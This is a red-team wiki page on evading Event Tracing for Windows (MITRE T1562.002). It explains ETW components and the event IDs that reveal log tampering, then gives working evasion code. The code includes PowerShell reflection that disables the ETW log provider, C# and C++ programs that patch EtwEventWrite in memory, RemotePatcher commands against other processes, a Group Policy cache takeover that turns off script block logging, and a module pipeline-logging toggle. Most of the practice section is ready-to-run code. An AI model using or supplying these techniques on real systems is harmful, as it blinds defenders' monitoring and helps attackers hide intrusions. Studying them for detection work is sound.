---
description: 'MITRE ATT&CK™ Impair Defenses: Disable or Modify Tools - Technique T1562.002'
---

# ETW evasion

## Theory

[Event Tracing for Windows (ETW)](https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-) provides a mechanism to trace and log events that are raised by user-mode applications and kernel-mode drivers.

### ETW Direct Attacks - Opsec considerations

{% hint style="danger" %}
Directly deleting ETW logs can be an OPSEC (Operational Security) risk.
{% endhint %}

Assuming an attacker did destroy all of the logs before they were forwarded to a SIEM by the SOC, or if they were not forwarded, how would this raise an alert? An attacker must first consider environment integrity; if no logs originate from a device, that can present serious suspicion and lead to an investigation. Even if an attacker did control what logs were removed and forwarded, defenders could still track the tampering.

<table><thead><tr><th width="131.5">EventID</th><th>Description</th></tr></thead><tbody><tr><td><strong>1102</strong></td><td>Logs when the Windows Security audit log was cleared</td></tr><tr><td><strong>104</strong></td><td>Logs when the log file was cleared</td></tr><tr><td><strong>1100</strong></td><td>Logs when the Windows Event Log service was shut down</td></tr></tbody></table>

## ETW Components

ETW is broken up into three separate components, working together to manage and correlate data. Event logs in Windows are no different from generic XML data, making it easy to process and interpret.

**Event Controllers** are used to build and configure sessions. To expand on this definition, we can think of the controller as the application that determines how and where data will flow. From the [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#controllers), “Controllers are applications that define the size and location of the log file, start and stop event tracing sessions, enable providers so they can log events to the session, manage the size of the buffer pool, and obtain execution statistics for sessions.”

**Event Providers** are used to generate events. To expand on this definition, the controller will tell the provider how to operate, then collect logs from its designated source. From the [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#providers), “Providers are applications that contain event tracing instrumentation. After a provider registers itself, a controller can then enable or disable event tracing in the provider. The provider defines its interpretation of being enabled or disabled. Generally, an enabled provider generates events, while a disabled provider does not.”

**Event Consumers** are used to interpret events. To expand on this definition, the consumer will select sessions and parse events from that session or multiple at the same time. This is most commonly seen in the “_Event Viewer”._ From the [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#consumers), “Consumers are applications that select one or more event tracing sessions as a source of events. A consumer can request events from multiple event tracing sessions simultaneously; the system delivers the events in chronological order. Consumers can receive events stored in log files, or from sessions that deliver events in real time.”

<figure><img src="../../.gitbook/assets/dc8217f5aecbcc08d609c3299756da08.png" alt=""><figcaption></figcaption></figure>

Now that we understand how ETW is instrumented, how does this apply to attackers? We previously mentioned the goal of limiting visibility while maintaining integrity. We can limit a specific aspect of insight by targeting components while maintaining most of the data flow. Below is a brief list of specific techniques that target each ETW component.

<table><thead><tr><th width="164.5">Component</th><th>Techniques</th></tr></thead><tbody><tr><td>Provider</td><td>PSEtwLogProvider Modification, Group Policy Takeover, Log Pipeline Abuse, Type Creation</td></tr><tr><td>Controller</td><td>Patching EtwEventWrite, Runtime Tracing Tampering,</td></tr><tr><td>Consumers</td><td>Log Smashing, Log Tampering</td></tr></tbody></table>

## Practice

To find where AMSI is instrumented, we can use [InsecurePowerShell](https://github.com/cobbr/InsecurePowerShell) maintained by [Cobbr](https://github.com/cobbr) which is a GitHub fork of PowerShell with security feature removed, and compare it with an [offical PowerShell GitHub](https://github.com/PowerShell/PowerShell).

### PowerShell - PSEtwLogProvider Reflection

Within PowerShell, ETW providers are loaded into the session from a **.NET assembly**: `PSEtwLogProvider`. From the [Microsoft docs](https://docs.microsoft.com/en-us/dotnet/standard/assembly/), "Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications."

In a PowerShell session, most .NET assemblies are loaded in the same security context as the user at startup. Since the session has the same privilege level as the loaded assemblies, we can modify the assembly fields and values through PowerShell reflection.\
In the context of **ETW** (**E**vent **T**racing for **W**indows), an attacker can reflect the ETW event provider assembly and set the field `m_enabled` to `$null`

{% tabs %}
{% tab title="Powershell" %}
At a high level, PowerShell reflection can be broken up into four steps:

1. Obtain .NET assembly for `PSEtwLogProvider`.
2. Store a null value for `etwProvider` field.
3. Set the field for `m_enabled` to previously stored value.

<pre class="language-bash"><code class="lang-bash"><strong>#obtain the type for the PSEtwLogProvider assembly
</strong><strong>$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
</strong><strong>
</strong><strong>#we are storing a value ($null) from the previous assembly to be used.
</strong><strong>$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
</strong><strong>
</strong><strong>#we compile our steps together to overwrite the m_enabled field with the value stored in the previous line
</strong>[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
</code></pre>
{% endtab %}
{% endtabs %}

### Patching Tracing Functions

ETW is loaded from the runtime of every new process, commonly originating from the **CLR** (**C**ommon **L**anguage **R**untime). Within a new process, ETW events are sent from the userland and issued directly from the current process. An attacker can write pre-defined opcodes to an in-memory function of ETW to patch and disable functionality.

{% tabs %}
{% tab title="C#" %}
At a high level, ETW patching on x64bits systems can be broken up into five steps:

1. Obtain a handle for `EtwEventWrite`
2. Modify memory permissions of the function
3. Write opcode bytes to memory
4. Reset memory permissions of the function (optional)
5. Flush the instruction cache (optional)

```csharp
using System;
using System.ComponentModel;
using System.Reflection;
using System.Runtime.InteropServices;

namespace test
{
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();
    }

    class Program
    {
        static void Main(string[] args)
        {

            // Used for x86
            PatchEtw(new byte[] { 0xc2, 0x14, 0x00 });

            // Patch for x64: xor rax, rax; ret
            //PatchEtw(new byte[] { 0x48, 0x33, 0xc0, 0xc3 }); 

            Console.WriteLine("ETW Now Unhooked, further calls or Assembly.Load will not be logged");
            Console.ReadLine();
            //Assembly.Load(new byte[] { });
        }

        private static void PatchEtw(byte[] patch)
        {
            try
            {
                uint oldProtect;
                uint oldOldProtect;

                //we need to obtain a handle for the address of EtwEventWrite
                var ntdll = Win32.LoadLibrary("ntdll.dll");
                var etwEventSend = Win32.GetProcAddress(ntdll, "EtwEventWrite");

                //we need to modify the memory permissions of the function to allow us to write to the function
                Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);

                //the function has the permissions we need to write to it, and we have the pre-defined opcode to patch it. 
                //Because we are writing to a function and not a process, we can use the infamous Marshal.Copy to write our opcode
                Marshal.Copy(patch, 0, etwEventSend, patch.Length);

                //we can begin cleaning our steps to restore memory permissions as they were.
                Win32.VirtualProtect(etwEventSend,(UIntPtr)4, oldProtect,out oldOldProtect);

                //we can ensure the patched function will be executed from the instruction cache.
                Win32.FlushInstructionCache(Win32.GetCurrentProcess(), etwEventSend, (UIntPtr)patch.Length);
            
            }
            catch
            {
                Console.WriteLine("Error unhooking ETW");
            }
        }
    }
}
```
{% endtab %}

{% tab title="C++" %}
At a high level, ETW patching on x64bits systems can be broken up into five steps:

1. Obtain a handle for `EtwEventWrite`
2. Modify memory permissions of the function
3. Write opcode bytes to memory
4. Reset memory permissions of the function (optional)
5. Flush the instruction cache (optional)

```cpp
#include <iostream>
#include <windows.h>

int main()
{
	//x64 patch: xor rax, rax; ret 
    	unsigned char etwPatch[] = { 0x48, 0x33, 0xc0, 0xc3 };
	//x86 patch: xor rax, rax; ret 
	//unsigned char etwPatch[] = { 0xc2, 0x14, 0x00 };
	DWORD dwOld = 0;
	
	//we need to obtain a handle for the address of EtwEventWrite
	FARPROC ptrNtTraceEvent = GetProcAddress(LoadLibrary(L"ntdll.dll"), "EtwEventWrite");
	
	//we need to modify the memory permissions of the function to allow us to write to the function
	VirtualProtect(ptrNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &dwOld);
	
	//the function has the permissions we need to write to it, and we have the pre-defined opcode to patch it. 
        //Because we are writing to a function and not a process, we can use the infamous Marshal.Copy to write our opcode
	memcpy(ptrNtTraceEvent, etwPatch, 1);
	
	//we can begin cleaning our steps to restore memory permissions as they were.
	VirtualProtect(ptrNtTraceEvent, 1, dwOld, &dwOld);
	
}
```
{% endtab %}

{% tab title="Remote Process Patching" %}
We can perform similar patch but for a remote process with an handle on the target process. We may use the [RemotePatcher](https://github.com/Hagrid29/RemotePatcher) tool from @Hagrid29.

```powershell
#Patch ETW on a remote process and do not patch AMSI
cmd> .\RemotePatcher.exe --pid 9756 -na

#Patch ETW on the program that will be executed and patched
cmd> .\RemotePatcher.exe --exe c:\Users\Pwned\evil.exe -na
```
{% endtab %}
{% endtabs %}

### Powershell - GPO Takeover

ETW has a lot of coverage out of the box, but it will disable some features unless specified because of the amount of logs they can create. These features can be enabled by modifying the **GPO** (**G**roup **P**olicy **O**bject) settings of their parent policy. \
Two of the most popular GPO providers provide coverage over PowerShell, including **script block logging** and **module logging**.

Within a PowerShell session, system assemblies are loaded in the same security context as users. This means an attacker has the same privilege level as the assemblies that cache GPO settings. Using reflection, an attacker can obtain the utility dictionary and modify the group policy for either PowerShell provider.

{% tabs %}
{% tab title="Powershell" %}
At a high-level a group policy takeover can be broken up into three steps:

1. Obtain group policy settings from the utility cache.
2. Modify generic provider to `0`.
3. Modify the invocation or module definition.

```powershell
$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
  If ($GroupPolicyField) {
      $GroupPolicyCache = $GroupPolicyField.GetValue($null);
      If ($GroupPolicyCache['ScriptBlockLogging']) {
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
      }
      $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new();
      $val.Add('EnableScriptBlockLogging', 0);
      $val.Add('EnableScriptBlockInvocationLogging', 0);
      $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val
  };
```

{% hint style="info" %}
Will evade EventIDs 4103 & 4104
{% endhint %}
{% endtab %}
{% endtabs %}

### Abusing Log Pipeline

Within PowerShell, each module or snap-in has a setting that anyone can use to modify its logging functionality. From the [Microsoft docs](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_eventlogs?view=powershell-5.1#logging-module-events), “When the _LogPipelineExecutionDetails_ property value is TRUE (`$true`), Windows PowerShell writes cmdlet and function execution events in the session to the Windows PowerShell log in Event Viewer.” An attacker can change this value to `$false` in any PowerShell session to disable a module logging for that specific session. The Microsoft docs even note the ability to disable logging from a user session, “To disable logging, use the same command sequence to set the property value to FALSE (`$false`).”

{% tabs %}
{% tab title="Powershell" %}
At a high-level the log pipeline technique can be broken up into four steps:

1. Obtain the target module.
2. Set module execution details to `$false`.
3. Obtain the module snap-in.
4. Set snap-in execution details to `$false`.

```powershell
$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false
  
```
{% endtab %}
{% endtabs %}



## Resources

{% embed url="https://tryhackme.com/room/monitoringevasion" %}
